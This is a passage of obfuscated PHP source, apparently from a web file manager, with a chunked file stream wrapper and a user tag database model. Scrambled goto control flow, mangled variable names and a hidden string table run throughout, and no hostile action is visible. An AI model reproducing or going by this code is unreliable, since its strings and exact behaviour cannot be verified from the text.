F»Óµ¿åëÔ: } public function download($f»Ω◊øΩÖÈ, $d⁄≈–áﬁÏ) { Downloader::start($f»Ω◊øΩÖÈ, $d⁄≈–áﬁÏ); return $d⁄≈–áﬁÏ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($dãüøØµ≠∞, $c∂ãªå®€ú = '') { goto eÿæ»„ªÀÂ; eÿæ»„ªÀÂ: $this->info = $this->info($dãüøØµ≠∞); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Æ¡î¢≠¯™][85]]; goto E⁄Á†ÈÔºµ; Büáà∫«ì‚: return $this->info ? !0 : !1; goto Dëü™êÛ‘…; E⁄Á†ÈÔºµ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$dãüøØµ≠∞])) { self::$_chunkBuffer[$dãüøØµ≠∞] = array(); } goto Büáà∫«ì‚; Dëü™êÛ‘…: } function stream_read($aµ∞–º∆ûà) { $Cœ√ã⁄Ìœã = $this->fileSubstr($this->pose, $aµ∞–º∆ûà); $this->pose += strlen($Cœ√ã⁄Ìœã); return $Cœ√ã⁄Ìœã; } public function stream_tell() { return $this->pose; } public function stream_seek($aîÉé€ñ˘è, $a°áÀﬂ‹èÎ) { $DØü◊¯®îÔ =& $_SERVER[Æ¡î¢≠¯™]; if ($a°áÀﬂ‹èÎ == SEEK_SET) { $this->pose = $aîÉé€ñ˘è; } else { if ($a°áÀﬂ‹èÎ == SEEK_CUR) { $this->pose += $aîÉé€ñ˘è; } else { if ($a°áÀﬂ‹èÎ == SEEK_END) { $this->pose = $this->info[$DØü◊¯®îÔ[87]] + intval($aîÉé€ñ˘è); } } } if ($aîÉé€ñ˘è < 0) { $this->pose = $this->info[$DØü◊¯®îÔ[87]] + $aîÉé€ñ˘è; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Æ¡î¢≠¯™][87]]; } public function stream_close() { return !0; } public function url_stat($AòÇ˘ôîÉâ, $Aı™¨®üë…) { $b¯•¶Í¡∂¯ =& $_SERVER[Æ¡î¢≠¯™]; $B“ãä¨Œ± = $this->info($AòÇ˘ôîÉâ); return array($b¯•¶Í¡∂¯[1269] => 0, $b¯•¶Í¡∂¯[1270] => 0, $b¯•¶Í¡∂¯[12] => 32768 + 511, $b¯•¶Í¡∂¯[1271] => 0, $b¯•¶Í¡∂¯[1272] => 0, $b¯•¶Í¡∂¯[1273] => 0, $b¯•¶Í¡∂¯[1274] => 0, $b¯•¶Í¡∂¯[87] => $B“ãä¨Œ±[$b¯•¶Í¡∂¯[87]], $b¯•¶Í¡∂¯[1275] => $B“ãä¨Œ±[$b¯•¶Í¡∂¯[1146]], $b¯•¶Í¡∂¯[1232] => $B“ãä¨Œ±[$b¯•¶Í¡∂¯[117]], $b¯•¶Í¡∂¯[1231] => $B“ãä¨Œ±[$b¯•¶Í¡∂¯[194]], $b¯•¶Í¡∂¯[1276] => 0, $b¯•¶Í¡∂¯[1277] => 0); } static $fileInfo = array(); public function info($CÒ∫ÂïÑ∆Ê) { $dªÆ”∞Ê†√ = $_SERVER[Æ¡î¢≠¯™][1278]; if (isset(self::$fileInfo[$CÒ∫ÂïÑ∆Ê])) { return self::$fileInfo[$CÒ∫ÂïÑ∆Ê]; } if (substr($CÒ∫ÂïÑ∆Ê, 0, strlen($dªÆ”∞Ê†√)) != $dªÆ”∞Ê†√) { return !1; } self::$fileInfo[$CÒ∫ÂïÑ∆Ê] = IO::info(substr($CÒ∫ÂïÑ∆Ê, strlen($dªÆ”∞Ê†√))); return self::$fileInfo[$CÒ∫ÂïÑ∆Ê]; } public static function read($CŒï’ëÊìﬂ, $b€ãèûøìë, $a‚‰ ê´éπ) { goto bë„éò€èÈ; B•Öë•’É¢: $e’æÉŒâñµ = 8192; fseek($F”›∏©‘è¬, $b€ãèûøìë, SEEK_SET); $B§”ª©û≠Ñ = $eû ú•◊Á˘[33]; goto d†ñß·ÖΩÆ; d†ñß·ÖΩÆ: $Bäï•ÓñÕÏ = 0; while ($Bäï•ÓñÕÏ < $a‚‰ ê´éπ) { $AÇ®◊…•ûë = min($e’æÉŒâñµ, $a‚‰ ê´éπ - $Bäï•ÓñÕÏ); $B§”ª©û≠Ñ .= fread($F”›∏©‘è¬, $AÇ®◊…•ûë); $Bäï•ÓñÕÏ += $AÇ®◊…•ûë; } fclose($F”›∏©‘è¬); goto a∞ˆîƒâ€ø; bë„éò€èÈ: $eû ú•◊Á˘ =& $_SERVER[Æ¡î¢≠¯™]; $F”›∏©‘è¬ = fopen($CŒï’ëÊìﬂ, $eû ú•◊Á˘[1148]); if (!$F”›∏©‘è¬) { return $eû ú•◊Á˘[33]; } goto B•Öë•’É¢; a∞ˆîƒâ€ø: return $B§”ª©û≠Ñ; goto déÉ´∆ó¡°; déÉ´∆ó¡°: } public function fileSubstr($Aéóö€÷˜ù, $dÿ€äπÉ≤≈) { goto fﬁ£ÿã…¢†; EŸäŸÒ§Îπ: if ($Aéóö€÷˜ù + $dÿ€äπÉ≤≈ > $CË∆¨óÜ€€) { $dÿ€äπÉ≤≈ = $CË∆¨óÜ€€ - $Aéóö€÷˜ù; } if ($dÿ€äπÉ≤≈ <= 0) { return $a»√ÁøﬁÛ›[33]; } if ($Aéóö€÷˜ù < 0 || $Aéóö€÷˜ù >= $CË∆¨óÜ€€ || $dÿ€äπÉ≤≈ <= 0 || $dÿ€äπÉ≤≈ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\x65\x52\145\141\144\x20\x65\162\x72\x6f\162\41\x20\163\164\141\162\x74\75{$Aéóö€÷˜ù}\73\154\145\x6e\147\x74\x68\75{$dÿ€äπÉ≤≈}\73\x20\163\x69\x7a\145\75{$CË∆¨óÜ€€}\73"); } goto A˜Èä»çâÖ; fÛ˘‚Õ≤€±: $C§à‡ˆ¢Õ÷ = ceil(($Aéóö€÷˜ù + $dÿ€äπÉ≤≈) / $CÉ˘ııÚÿ¯) * $CÉ˘ııÚÿ¯ - $a›∆é€ùÿÍ; $eÃäì–†‰§ = IO::fileSubstr($this->path, $a›∆é€ùÿÍ, $C§à‡ˆ¢Õ÷); $Dõ˘£ÈåÇ‹[$a›∆é€ùÿÍ . $a»√ÁøﬁÛ›[33]] = $eÃäì–†‰§; goto bÎ¬Öá‹´˜; A˜Èä»çâÖ: $CÉ˘ııÚÿ¯ = 64 * 1024; $Dõ˘£ÈåÇ‹ =& self::$_chunkBuffer[$this->path]; if (!$Dõ˘£ÈåÇ‹) { $Dõ˘£ÈåÇ‹ = array(); } goto f£€‰ñÕÒ›; fﬁ£ÿã…¢†: $a»√ÁøﬁÛ› =& $_SERVER[Æ¡î¢≠¯™]; $CË∆¨óÜ€€ = $this->info[$a»√ÁøﬁÛ›[87]]; $dŒÜ‚â≠çã = $Aéóö€÷˜ù; goto a§Ã§¬÷ù°; f£€‰ñÕÒ›: $fåÓﬂ±Î¡◊ = 0; $c˜Ü¢‘ŒÍ© = 0; $CàÕ—ı÷´´ = $a»√ÁøﬁÛ›[33]; goto eÒ≤‰·‡ùÃ; bÎ¬Öá‹´˜: ksort($Dõ˘£ÈåÇ‹); $B√˘óë…–ö = substr($eÃäì–†‰§, $Aéóö€÷˜ù - $a›∆é€ùÿÍ, $dÿ€äπÉ≤≈); return $B√˘óë…–ö; goto Få◊ôÌ¨Ì›; a§Ã§¬÷ù°: $A≈÷èÖëˆ  = $dÿ€äπÉ≤≈; if ($Aéóö€÷˜ù < 0) { $Aéóö€÷˜ù = $CË∆¨óÜ€€ + $Aéóö€÷˜ù; } if ($dÿ€äπÉ≤≈ === !1) { $dÿ€äπÉ≤≈ = $CË∆¨óÜ€€ - $Aéóö€÷˜ù; } goto EŸäŸÒ§Îπ; eÒ≤‰·‡ùÃ: foreach ($Dõ˘£ÈåÇ‹ as $fåÓﬂ±Î¡◊ => $CàÕ—ı÷´´) { $fåÓﬂ±Î¡◊ = intval($fåÓﬂ±Î¡◊); $c˜Ü¢‘ŒÍ© = $fåÓﬂ±Î¡◊ + strlen($CàÕ—ı÷´´); if ($Aéóö€÷˜ù >= $c˜Ü¢‘ŒÍ©) { continue; } if ($Aéóö€÷˜ù >= $fåÓﬂ±Î¡◊ && $Aéóö€÷˜ù + $dÿ€äπÉ≤≈ <= $c˜Ü¢‘ŒÍ©) { return substr($CàÕ—ı÷´´, $Aéóö€÷˜ù - $fåÓﬂ±Î¡◊, $dÿ€äπÉ≤≈); } break; } if (count($Dõ˘£ÈåÇ‹) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($a»√ÁøﬁÛ›[1279], $a»√ÁøﬁÛ›[1280] . count($Dõ˘£ÈåÇ‹) . "\x3b\163\x74\x61\162\x74\75{$Aéóö€÷˜ù}\x2c\154\145\x6e\x67\x74\150\75{$dÿ€äπÉ≤≈}\73\160\x6f\163\145\72{$fåÓﬂ±Î¡◊}\176{$c˜Ü¢‘ŒÍ©}"); throw new Exception($a»√ÁøﬁÛ›[1281]); } $a›∆é€ùÿÍ = intval($Aéóö€÷˜ù / $CÉ˘ııÚÿ¯) * $CÉ˘ııÚÿ¯; goto fÛ˘‚Õ≤€±; Få◊ôÌ¨Ì›: } private function log($c–—Îœ–éÙ, $a∂ÍóÇË„‘) { $Fï‰úË•ä› =& $_SERVER[Æ¡î¢≠¯™]; $c»˘óÛÕ∑Ï = timeFloat() - $this->timeStart; write_log(sprintf($Fï‰úË•ä›[1282], $c–—Îœ–éÙ, $this->info[$Fï‰úË•ä›[28]], $c»˘óÛÕ∑Ï, $a∂ÍóÇË„‘), $Fï‰úË•ä›[1197]); } } goto fá∫ÆââÒë; EƒÂ≈∑ÕâŸ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($b∞™“É»√) { $eãŸ¬†≤Çé =& $_SERVER[Æ¡î¢≠¯™]; return array($eãŸ¬†≤Çé[2432] => array(USER_ID, $eãŸ¬†≤Çé[2489])); } protected function listData() { $Bî±¯Ø”é™ =& $_SERVER[Æ¡î¢≠¯™]; $Có∏ß≠ñÃØ = array($Bî±¯Ø”é™[1388] => USER_ID, $Bî±¯Ø”é™[440] => array($Bî±¯Ø”é™[2490], 0)); $D“É¬Ø∂¶î = $Bî±¯Ø”é™[2491]; $dÇË‘¬ä›ß = $Bî±¯Ø”é™[2492]; $Aà…ô¿¡ó£ = $this->field($D“É¬Ø∂¶î)->where($Có∏ß≠ñÃØ)->order($dÇË‘¬ä›ß)->select(); return $Aà…ô¿¡ó£ ? $Aà…ô¿¡ó£ : array(); } protected function listByTag($C∂¢›Ú’ä) { } protected function addToTag($eıı∑Œ«∑ë, $f“¿õßÀ‡ÿ) { $fåû°Êç‹™ =& $_SERVER[Æ¡î¢≠¯™]; if (!Model($fåû°Êç‹™[2261])->listData($f“¿õßÀ‡ÿ) || !Model($fåû°Êç‹™[744])->pathInfo($eıı∑Œ«∑ë)) { return !1; } $BßÛéöÜëË = array($fåû°Êç‹™[1388] => USER_ID, $fåû°Êç‹™[440] => $f“¿õßÀ‡ÿ, $fåû°Êç‹™[392] => $eıı∑Œ«∑ë, $fåû°Êç‹™[393] => $fåû°Êç‹™[387], $fåû°Êç‹™[391] => $fåû°Êç‹™[33], $fåû°Êç‹™[2065] => 0); if ($this->where($BßÛéöÜëË)->find()) { return !1; } return $this->add($BßÛéöÜëË); } protected function removeFromTag($eÖ–ÊƒÇ°†, $A∆¢ı‡õÌÜ) { $EÌÇ¿Üí–ú =& $_SERVER[Æ¡î¢≠¯™]; if (!Model($EÌÇ¿Üí–ú[2261])->listData($A∆¢ı‡õÌÜ) || !Model($EÌÇ¿Üí–ú[744])->pathInfo($eÖ–ÊƒÇ°†)) { return !1; } $BÔ≤ÜÇ§æÓ = array($EÌÇ¿Üí–ú[1388] => USER_ID, $EÌÇ¿Üí–ú[440] => $A∆¢ı‡õÌÜ, $EÌÇ¿Üí–ú[393] => $EÌÇ¿Üí–ú[387], $EÌÇ¿Üí–ú[392] => $eÖ–ÊƒÇ°†); return $this->where($BÔ≤ÜÇ§æÓ)->delete(); } protected function removeByTag($AÕ«–Ì°∆≥) { $dµÂ¯Çä–¬ =& $_SERVER[Æ¡î¢≠¯™]; if (!$AÕ«–Ì°∆≥) { return !1; } $cøñ®‰∫ôã = array($dµÂ¯Çä–¬[1388] => USER_ID, $dµÂ¯Çä–¬[440] => $AÕ«–Ì°∆≥); return $this->where($cøñ®‰∫ôã)->delete(); } protected function removeBySource($DâÈò⁄∆Î≥) { $Fòﬂçµ‘√  =& $_SERVER[Æ¡î¢≠¯™]; $FﬂºåéÕï“ = array($Fòﬂçµ‘√ [1388] => USER_ID, $Fòﬂçµ‘√ [392] => $DâÈò⁄∆Î≥, $Fòﬂçµ‘√ [440] => array($Fòﬂçµ‘√ [916], 0)); return $this->where($FﬂºåéÕï“)->delete(); } }